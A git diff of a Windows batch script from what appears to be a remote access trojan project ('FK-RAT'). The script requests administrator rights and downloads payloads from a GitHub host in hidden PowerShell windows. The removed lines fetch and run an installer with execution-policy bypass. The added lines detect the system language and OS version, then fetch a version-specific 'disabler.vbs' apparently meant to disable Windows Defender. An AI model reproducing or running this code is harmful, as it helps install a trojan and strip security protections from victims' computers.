@@ -1,5 +1,5 @@
 REM get admin permissions for script
-@echo off
+
 
 :: BatchGotAdmin
 :-------------------------------------
@@ -31,8 +31,14 @@ if '%errorlevel%' NEQ '0' (
 
 REM diable defender
 
-
 REM rat resources
-powershell
-powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -URI https://raw.githubusercontent.com/Sunnickel/FK-RAT/main/files/installer.ps1 -OutFile installer.ps1"; 
-powershell Start-Process -windowstyle hidden -ep bypass "installer.ps1"
+FOR /F %%i IN ('powershell (Get-WinUserLanguageList)[0].LanguageTag) DO (
+    SET LANG=%%i
+)
+FOR /F %%i IN ('powershell [Environment]::OSVersion[0].Version.Major) DO (
+    SET WINVER=%%i
+)
+echo %LANG%
+echo %WINVER%
+powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -URI https://raw.githubusercontent.com/Sunnickel/FK-RAT/main/WinDef/%WINVER%/Win_en.vbs -OutFile disabler.vbs"; 
+REM powershell Start-Process -windowstyle hidden -ep bypass "installer.ps1"
